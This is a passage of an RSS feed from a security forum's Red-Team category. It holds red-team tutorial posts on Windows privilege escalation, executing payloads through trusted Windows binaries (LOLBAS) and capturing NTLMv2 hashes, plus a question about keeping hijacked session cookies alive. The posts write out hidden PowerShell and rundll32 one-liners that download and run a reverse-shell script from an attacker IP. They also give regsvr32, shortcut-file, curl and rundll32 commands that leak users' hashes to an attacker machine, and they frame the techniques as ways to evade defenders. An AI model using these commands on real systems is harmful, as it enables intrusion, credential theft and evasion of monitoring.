<pre><code class="lang-auto">Sharpup.exe audit
</code></pre>
<p>And it finds 2 methods to Privesc which with a little more research we can actually see that its very simple since our User is already an Admin but the Shell isn’t running with High Privileges</p>
<p><em>Don’t forget to use the PowerShell version if you can’t get the C# to work</em></p>
<p>¯_(ツ)_/¯</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/6/6ed9b922c4a76f95faba69b97994b43dfdc3c937.png" data-download-href="/uploads/short-url/fOCZtql7VW6LKGrjSLCEFpE3SfR.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6ed9b922c4a76f95faba69b97994b43dfdc3c937_2_638x500.png" alt="" data-base62-sha1="fOCZtql7VW6LKGrjSLCEFpE3SfR" width="638" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6ed9b922c4a76f95faba69b97994b43dfdc3c937_2_638x500.png, https://0x00sec.s3.amazonaws.com/optimized/2X/6/6ed9b922c4a76f95faba69b97994b43dfdc3c937_2_957x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/6/6ed9b922c4a76f95faba69b97994b43dfdc3c937.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6ed9b922c4a76f95faba69b97994b43dfdc3c937_2_10x10.png"></a></div><p></p>
<p><em>Responder</em></p>
<p>Aaaah the amazing tool for Active Directories and almost everything Windows. I won’t explain into detail about Responder since there is so much out there about this tool. But TL;DR is that Responder…… well Responds to LLLMNR, NBT-NS requests, by poisoning these requests when a user misspells or tries to access an non-existent Share responder will say “Yeah it’s Me!!”and with that it can Capture the NTLMv2 hashes.</p>
<p>Its very easy to use just have responder running on the local area network and wait for requests, Of Course recommended by the Creator a good Pentester always recons first using  “-A”  no need to respond to EVERY request just a few target machines, try to be as stealthy as you can.</p>
<p>[But were not trying to be stealthy here we want Admin!!! So let’s respond!!!]</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/e457f062567316c632f255212f8cd188419dee85.png" data-download-href="/uploads/short-url/wA1gQqcRfXsa7DHynC5m6mUWXxH.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e457f062567316c632f255212f8cd188419dee85_2_690x157.png" alt="" data-base62-sha1="wA1gQqcRfXsa7DHynC5m6mUWXxH" width="690" height="157" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e457f062567316c632f255212f8cd188419dee85_2_690x157.png, https://0x00sec.s3.amazonaws.com/original/2X/e/e457f062567316c632f255212f8cd188419dee85.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/e/e457f062567316c632f255212f8cd188419dee85.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e457f062567316c632f255212f8cd188419dee85_2_10x10.png"></a></div><p></p>
<p>And just like that</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/37ae9cb8ead792a0e01e552656d0f9e480737f9c.png" data-download-href="/uploads/short-url/7WAmG3KVAJk4ePl9vwlYS0QBhrS.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/3/37ae9cb8ead792a0e01e552656d0f9e480737f9c_2_690x343.png" alt="" data-base62-sha1="7WAmG3KVAJk4ePl9vwlYS0QBhrS" width="690" height="343" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/3/37ae9cb8ead792a0e01e552656d0f9e480737f9c_2_690x343.png, https://0x00sec.s3.amazonaws.com/original/2X/3/37ae9cb8ead792a0e01e552656d0f9e480737f9c.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/3/37ae9cb8ead792a0e01e552656d0f9e480737f9c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/37ae9cb8ead792a0e01e552656d0f9e480737f9c_2_10x10.png"></a></div><p></p>
<p>From here it’s just cracking this hash to grab a ClearText password, or you can use NtlmRelay…</p>
<p>More info <a href="https://en.hackndo.com/ntlm-relay/" rel="noopener nofollow ugc">here</a></p>
<p><strong>3.- Exploitation</strong></p>
<p>Alright here is an interesting one and sometimes very difficult to work with, you Test and you Test , you are sure the exploit works in your Environment but when you use it live. Uh Oh the System Crashed, it didn’t work??!</p>
<p>Or just nothing happens. Even if this happens let’s imagine it all went fine!! Let me show the most current Example going on in the World right now on a Local privilege Escalation method.</p>
<p><em>WesNg</em></p>
<p>Another amazing tool I stumbled upon <em>Thank You Twitter.</em> The creator loved the Windows-Exploit-Suggester by GDS Security but unfortunately it hasn’t been updated since 2017 so taking matters into his own hands BOOM, WESNG was born and has been using the latest information for exploits. Its very easy to use, on your regular shell grab the sysinfo.exe information save it onto a txt file and run the script with file as a parameter.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288.png" data-download-href="/uploads/short-url/5UHnducTZvwR7eu6SJl0MK6jBRm.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_465x500.png" alt="" data-base62-sha1="5UHnducTZvwR7eu6SJl0MK6jBRm" width="465" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_465x500.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_697x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_10x10.png"></a></div><p></p>
<p>Then we use the following syntax</p>
<pre><code class="lang-auto">wes.py SYSINFO.TXT
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/096a75109b1902ea27643761bc552626db0f0b98.png" data-download-href="/uploads/short-url/1linCeA4wHCFLXfTTBrOiBaWj6E.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/096a75109b1902ea27643761bc552626db0f0b98_2_690x256.png" alt="" data-base62-sha1="1linCeA4wHCFLXfTTBrOiBaWj6E" width="690" height="256" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/096a75109b1902ea27643761bc552626db0f0b98_2_690x256.png, https://0x00sec.s3.amazonaws.com/original/2X/0/096a75109b1902ea27643761bc552626db0f0b98.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/0/096a75109b1902ea27643761bc552626db0f0b98.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/096a75109b1902ea27643761bc552626db0f0b98_2_10x10.png"></a></div><p></p>
<p>SMBGhost</p>
<p>Aaah the talk of the moment, [I think…] a new vulnerability that grants us SYSTEM access this is the most recent I can find and will show you how its being exploited. Newest Exploit and it looks very simple to attack.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61.gif" data-download-href="/uploads/short-url/nJEtfZWi4bTK5iOdHQwWQGww7mN.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61_2_689x499.gif" alt="" data-base62-sha1="nJEtfZWi4bTK5iOdHQwWQGww7mN" width="689" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61_2_689x499.gif, https://0x00sec.s3.amazonaws.com/original/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61_2_10x10.png"></a></div><p></p>
<p>But how do we search for this vulnerability?, well there are a few methods we can check it by using the SMBGhost Scanner script by ollypwn.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d34c1978d78a96934788718e3b0a5cac4ec54195.png" class="thumbnail onebox-avatar" width="400" height="400">

<h3><a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener nofollow ugc">ollypwn/SMBGhost</a></h3>

<p>Scanner for CVE-2020-0796 - SMBv3 RCE. Contribute to ollypwn/SMBGhost development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Or we can search for the Patch and see if it was applied where you can find more info <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796" rel="noopener nofollow ugc">here</a></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8f1a87c5c372a2a3e69cf711dc1f06b6d9fc84b2.png" alt="" data-base62-sha1="kpX7oDeeq2D0eXO6zIrDt0BLm7g" width="644" height="208"></p>
<p>We can search with the PowerShell Cmdlet <strong>Get-Hotfix</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8d921aaa5b54257b494f1c5df8acc2a2b3e9bde8.png" alt="" data-base62-sha1="kcolHCi0ibIrliNtIU1DbOZRsq4" width="574" height="278"></p>
<p>Uh Oh not here.</p>
<p>As you noticed we seen various methods for gaining higher privileges we used Offensive Tool to do the recon and we also used in-house commands to check our environment as well to find vulnerable OS we did the easy thing in just searching for stored passwords in clear text if you been pentesting or just playing with CTF you will notice the phrase “Low hanging Fruit” And yeah, don’t break your head sometimes the answer is very simple (Believe me).</p>
<p>Happy Hacking and hope you love a little more Red- Team.</p>
            <p><small>6 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/privilege-escalation/22302">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/privilege-escalation/22302</link>
          <pubDate>Sat, 18 Jul 2020 19:29:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22302</guid>
          <source url="https://0x00sec.org/t/privilege-escalation/22302.rss">Privilege Escalation</source>
        </item>
        <item>
          <title>Execution (LOLBAS)</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <h1>Execution</h1>
<p>In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as <em><strong>Living Off The Land Binaries and Scripts (and also Libraries)</strong></em> but what are these Executable that I utilized???. They are Windows Trusted Binaries that come installed into the System already, by living off the Land we utilize trusted binaries from Windows to execute our Malicious Binaries, in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a> I was explained why these are utilized by APT (Advanced Persistent Threats) some of the reasons given were:</p>
<ul>
<li>Avoid creating new processes/network connections</li>
<li>Avoid creating anomalous parent/child relationships</li>
<li>Avoid creating/modifying files/registry entries</li>
<li>Avoid creating memory anomalies</li>
<li>Avoid leaving evidence in log files</li>
</ul>
<p>Why is this good?, well let me show you an Example if we execute a malicious binary or command that calls back to our attacking machine what does the Blue Team see??, Well if we use some of the tools available (SysInternals) this is a great way to view what is going on.</p>
<p>Let’s catch a Shell using a PowerShell Script.</p>
<pre><code class="lang-auto">powershell.exe -W 1 -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.15:8000/Connect-BDTcp.ps1');
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5547d2440777145e5788b06f5726baeedab5824f.png" alt="" data-base62-sha1="caqsC5CFWSlJJWHb3YFoh6BaoTt" width="" height=""></p>
<p>Shell</p>
<p>I used this command because I am telling power shell that I want the Window-Style as Hidden so when executed it is not shown (“Obviously!!”) on the Victim machine.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/019b1695cd98d5829a6e1c5b1fb32bc315416fcf.png" alt="" data-base62-sha1="ecKErrx4YDloNZ7IS4vh8isG4L" width="" height=""></p>
<p>No Window!!</p>
<p>But here comes in Sysinternals, Process Explorer what can we see with this Marvelous Tool.</p>
<p>Uh Oh, nothing good an obvious PowerShell execution, with a Network Connection being established.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e7dc45208463b02d45f1cd1f2733d717c6bd2411.png" alt="" data-base62-sha1="x58dLucoIXO8NSxramjRdpsj0Cl" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f7ef086c7411b9e1ca9f83b0ef77b44683846116.png" alt="" data-base62-sha1="znk3LRkfeB2vZPKqlhyb9TFVG3c" width="" height=""></p>
<p>Not good this will get caught Immediately, Poor Opsec and very obvious to a tool for monitoring, we have to make this a little more difficult to catch, here come’s LOLBAS.</p>
<p>For the sake of Demonstration I will use RunDLL to call the same PowerShell Script and Execute. In the following example it combines with JavaScript so it can execute powershell and call the script remotely usually rundll32 will execute DLL files but this can be combined to execute commands as well.</p>
<pre><code class="lang-auto">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
</code></pre>
<p>Here we go, a little better since rundll32 is a legit process sometimes it’s nothing to worry about. But…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc1d260bff3f54fde38d827433065ba7cc4f411a.png" alt="" data-base62-sha1="t7FQZ5R7FaWfSxBUgIxCD3Ich0m" width="" height=""></p>
<p>What is this Command Line Syntax being used!!!.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/72d95631f248d6ae7d7e5edaf615392794ca4792.png" alt="" data-base62-sha1="go04y0mEDqZbvVu7UFBJfRTkQX8" width="" height=""></p>
<p>Yes we manage to avoid the creation of a Child Process, and it doesn’t show a Network Connection.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1972d27fe8b243678be3062d39c488d15f2556fe.png" alt="" data-base62-sha1="3D7Wqj5ZFbUwBGLLHM0FoRJ47hQ" width="" height=""></p>
<p>But we have that Syntax that can give us away, at least you get the idea we hid ourselves properly this time by using a legitimate Windows binary to execute our malicious payload.</p>
<p>OK let’s continue, now that we know a little into why these are used let’s show another example on what they can be used for as well, let’s imagine we have initial access in one of our engagements but this environment is well aware of what is going on with hacking, blacklisted known extensions and it’s very restricted on what can be executed our primary suspects here are “EXE, DLL, HTA, SCR” these files are known for executing malicious malware so here LOLBAS enters again, in this example we have access in a Developer machine, Visual Studio is installed (You know where this is going) and MSBuild is available.</p>
<p><em><strong>MSbuild: Microsoft Build Engine is a software build platform used by Visual Studio. it takes XML formatted project files. Adversaries can use MSBuild to proxy execution of code through a trusted windows utility. The inline task allows for C# code to be inserted in the XML project to compile and execute the arbitrary code.</strong></em></p>
<p>In this example we hold a small shell and we are trying to upgrade into our C2, and we only have MSBuild available to execute we upload our XML payload to the victim machine and utilize MSBuild to execute.</p>
<p>          <p><a href="https://vimeo.com/432322419">https://vimeo.com/432322419</a></p>
<br>
MSBuild Example</p>
<p>Great we got a shell proxy executing with MSBuild using an XML file with C# code inserted so it may compile and execute.</p>
<p>Finally our last example, we know how to execute files, evade logs, and the creation of child processes and the use of trusted binaries to execute our malware. Now let me demonstrate an example on UAC Bypass and Privesc with one of these trusted binaries</p>
<p>I enumerated the Machine and it contains a privilege escalation vulnerability named “Always Install Elevated” (more info <a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path" rel="noopener nofollow ugc">here</a>). I upload an MSI Malware and try to execute but what happens??.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2357a0b6c18e4c13b6e0da40baa5d2009d63f774.png" alt="" data-base62-sha1="52Es5ReMWFAduG2xGrNCiKXZ7Za" width="" height=""></p>
<p>No Shell</p>
<p>But why?, I got back to the Machine and I see this.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/524fd84ce91be874a78a984a90d9b0b17d98d1d4.png" alt="" data-base62-sha1="bKadBTIBcODf9aVNH0u9DOqV8oc" width="" height=""></p>
<p>UAC</p>
<p>Good old UAC, a feature implemented in Windows Vista, and Windows Server 2008, a more relaxed version on 7 and newer. Here come’s windows signed binaries again with these we can Bypass UAC, usually these binaries run with more elevated permissions or because Windows Trusts these to be executed (Now they are more monitored). But let’s see the Bypass in action.</p>
<p>          <p><a href="https://vimeo.com/432336491">https://vimeo.com/432336491</a></p>
</p>
<p>We worked with a few well known examples with windows signed binaries they are helpful for Executions and Bypasses these are few examples on what can be done with these Binaries you are more than welcome to review them <a href="https://lolbas-project.github.io/#" rel="noopener nofollow ugc">here</a> and in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a>. It will go more into detail and have various examples on what other things can be done.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/execution-lolbas/21922">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/execution-lolbas/21922</link>
          <pubDate>Thu, 25 Jun 2020 00:00:30 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21922</guid>
          <source url="https://0x00sec.org/t/execution-lolbas/21922.rss">Execution (LOLBAS)</source>
        </item>
        <item>
          <title>Capturing Hashes</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>A little from my Blog that I wanted to share here as well.</p>
<p><a href="https://dmcxblue.net" rel="noopener nofollow ugc"><em>DMCXBLUE</em></a></p>
<p>These examples will be used from a Reverse Shell, as not always we have the great GUI to use when we are in an engagement or simply it’s just not available because of X reason. I will try me best to work with this situation as I as well would love to be capable of running many techniques from just a simple Shell, [ <em>don’t know why but like it more that way</em> ].</p>
<h4>Responder</h4>
<p>In the first example I will use an awesome tool called “ <em><strong>Responder</strong></em> ” a great tool used for Poisoning LLMNR and NBT-NS responses, this cool works great when a user mistakenly mistypes a network share, the reason it works is because when Microsoft can’t find the Network name (DNS) it will fall back to LLMNR and NBT-NS from here responder, Responds to the connection telling the user that “Yes I am [Insert Name Here] and will capture the Ntlmv2 hash used for Authentication here is a sample on how to capture it with your Shell.</p>
<p>Use the “dir” command and try to list an UN-existing share from here Responder will start it’s magic in responding to that UN-existing share.</p>
<pre><code class="lang-auto">dir \\NotHere\C$
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f0b7fce90d92c96f54a5faa79d91eec189ab184b.png" alt="" data-base62-sha1="yluMGqOr4A8tV5t1FBgRhyZ0neX" width="660" height="472"></p>
<p>Reverse Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ffc806197eeac804d08291aa4421b676671a03b2.png" alt="" data-base62-sha1="AuKiQIoaSEWBb9YyWQTbsah0AZc" width="690" height="245"></p>
<h4>SMBServer.py</h4>
<p>A great tool from Impacket here we can create a fast SMB Server to share files and to Exfiltrate any Loot that we may find on the Network but we are focused in grabbing hashes, so how would this work?, Easy we setup the SMB Server and then we simply connect to it to capture the Hash.</p>
<p>In this example we also need to use the IP Addr of the attacking machine with it’s Share Name that we are trying to access.</p>
<pre><code class="lang-auto">dir \\&lt;IP ADDR&gt;\Fake-SMB
</code></pre>
<p>The user will receive an error like this if they ever try to access the Share you have to make sure to add SMB2Support for Compatibility Issues.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6366d92646ea0f60d7a63ab752f8b20c3f048dd0.png" alt="" data-base62-sha1="eblCuMYbGGdF9Fvaz4h2wcylYVq" width="690" height="241"></p>
<p>Error Message</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2a6f8efe671ddd15bfb91a426620896a0e73ad0c.png" alt="" data-base62-sha1="63p4986lQd5a7kntEFpMd5yNC56" width="657" height="500"></p>
<h4>Regsvr32.exe</h4>
<p>With this tool we can try and call an unexisting file from our Attacking Machine it will try to communicate and from here as well we will capture the Ntlmv2 Hash.</p>
<pre><code class="lang-auto">regsvr32.exe /s /u /i://10.0.2.15/@NotExist scrobj.dll
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bcb02d3eafed7ecc9be7b09ae3f3e9d0d8c5ff42.png" alt="" data-base62-sha1="qVddIVjlNcgmDWij4KXcslEk6Vs" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ea4df6fbbfd2ec0846e3676c780f8e854882cf5.gif" alt="" data-base62-sha1="klT2qtxNNZf93v3h5xGASzPmJnf" width="690" height="239"></p>
<h4>ShortCut Links</h4>
<p>What about Shortcut Links, make our target thing that they are trying to visit a website but they actually pinged our Machine??, Well since we have a powershell Shell we can create a simple LNK File to do this. We can use the following:</p>
<pre><code class="lang-auto">$WshShell = New-Object -comObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("hash.url")
$shortcut.TargetPath = "file://10.0.2.15/@NOTHERE"
$shortcut.Save()
</code></pre>
<p>And finally we can just call it from Powershell or wait for Our Target to execute it, we might want to do some SE here and make it like we replaced an LNK of there own.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/64d82f1722ced69c35eb2586b9fcb1ea4bead629.png" alt="" data-base62-sha1="eo6UYGWIcZJeZHcnDgEMhLgdAeZ" width="" height=""></p>
<p>Executing</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a3cc5664df248378930f67f3a3508fec3204c897.gif" alt="" data-base62-sha1="nn1CmjpY5ZT6nCfpuTmGW267ewT" width="690" height="239"></p>
<h4>Curl</h4>
<p>Yes as mentioned here, we can use Curl to capture NTLM hashes as well you mostly have to wonder about applications that make network connections as Curl is now integrated in Windows CMD and PowerShell it’s as simple as typing:</p>
<pre><code class="lang-auto">curl \\10.0.2.15\NOTHERE.txt
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/44b4aa5f3244cd723fa546be1faca4e2158f0eab.png" alt="" data-base62-sha1="9NNxBINAQP1Fz8AiKQRylp8Cv7d" width="" height=""></p>
<p>Responder Ready:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b34ac88d498e23648e5d915b5e71fdd5ceffd3c9.png" alt="" data-base62-sha1="pA5GM2TWm4nnp6RIs4Je3ixoICl" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/573aa9d5303ff4dd842ca5fdab45f4770a125ab3.gif" alt="" data-base62-sha1="crFdZBw4CIagUWeYmrNuC7AtbiP" width="690" height="239"></p>
<p>These are just a few techniques, methods which we can utilize from our trusty old ncat Shell and grab some NTLMv2 hashes and the good thing is that we don’t even need to Escalate Privileges we can just leave these files and wait for an Administrator to click them [ <em>It sometimes happens!</em> ] and we can capture those hashes as well from here we know how to proceed now we can use any Password Cracker [John, Hashcat, etc] To crack these hashes their are more techniques that are very useful for even catching a Shell [NTLM Relay] but we won’t dive into that I just wanted to demonstrate a few techniques on how to capture some hashes be wary it can be as simple as <code>rundll32.exe \\10.0.2.15\NOTHERE.txt,entrypoint</code> . [Another technique not explained] but you get the idea these binaries have network connection’s not just to execute remote files or download but we can capture Hashes as well!.</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/capturing-hashes/21826">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/capturing-hashes/21826</link>
          <pubDate>Thu, 18 Jun 2020 00:07:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21826</guid>
          <source url="https://0x00sec.org/t/capturing-hashes/21826.rss">Capturing Hashes</source>
        </item>
        <item>
          <title>Maintain Session Hijacking</title>
          <dc:creator><![CDATA[Oliver_Hill]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Hello Mates,</p>
<p>Wanted to get everyone’s thoughts on how they maintain access to accounts that have been hijacked using session cookies. The cookies will expire at some point so how would you maintain access when all you have is the session cookie? I’ve investigated changing the expiration date, but it appears that, depending on the site, this can invalidate the cookie on the server side so I’ve been reluctant to try this approach.</p>
<p>Cheers,<br>
Olly</p>
            <p><small>7 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/maintain-session-hijacking/20805">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/maintain-session-hijacking/20805</link>
          <pubDate>Sat, 25 Apr 2020 21:29:51 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20805</guid>
          <source url="https://0x00sec.org/t/maintain-session-hijacking/20805.rss">Maintain Session Hijacking</source>
        </item>
        <item>
          <title>Red Team - Gitbook</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <h2>Hi, dmcxblue here.</h2>
<p>So just letting know that I started a Gitbook in regards for Red Teaming stuff, it’s just some stuff to help me understand this area a little more better, what a better way then to try and teach people in an area you are totally unfamiliar with… According to my sense, just enough info that I can teach it myself. It’s based frequently on the ATT&amp;CK MITRE Framework with some examples. I know some other people have done this already and there job look’s incredible. But just trying to give it a shot and it also help’s somebody just the way it helped me. As Red Team topics are plentiful and always changing, such as techniques and tactics and such just how amazing these adversaries manage to just move around a network without being detected and the new techniques that researcher’s always find. Well enough typing and more hacking.<br>
Suggestions are welcomed, please let me know if there are more things I can make this book better.</p>
<p><a href="https://dmcxblue.gitbook.io/red-team-notes/" rel="nofollow noopener">Book</a></p>
<p>Thanks</p>
            <p><small>8 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/red-team-gitbook/19389">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/red-team-gitbook/19389</link>
          <pubDate>Fri, 21 Feb 2020 16:48:48 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19389</guid>
          <source url="https://0x00sec.org/t/red-team-gitbook/19389.rss">Red Team - Gitbook</source>
        </item>
        <item>
          <title>About the Red-Team category</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>(Replace this first paragraph with a brief description of your new category. This guidance will appear in the category selection area, so try to keep it below 200 characters. <strong>Until you edit this description or create topics, this category won’t appear on the categories page.</strong>)</p>
<p>Use the following paragraphs for a longer description, or to establish category guidelines or rules:</p>
<ul>
<li>
<p>Why should people use this category? What is it for?</p>
</li>
<li>
<p>How exactly is this different than the other categories we already have?</p>
</li>
<li>
<p>What should topics in this category generally contain?</p>
</li>
<li>
<p>Do we need this category? Can we merge with another category, or subcategory?</p>
</li>
</ul>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/about-the-red-team-category/10236">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/about-the-red-team-category/10236</link>
          <pubDate>Fri, 14 Dec 2018 16:54:53 +0000</pubDate>
          <discourse:topicPinned>Yes</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-10236</guid>
          <source url="https://0x00sec.org/t/about-the-red-team-category/10236.rss">About the Red-Team category</source>
        </item>
  </channel>
</rss>
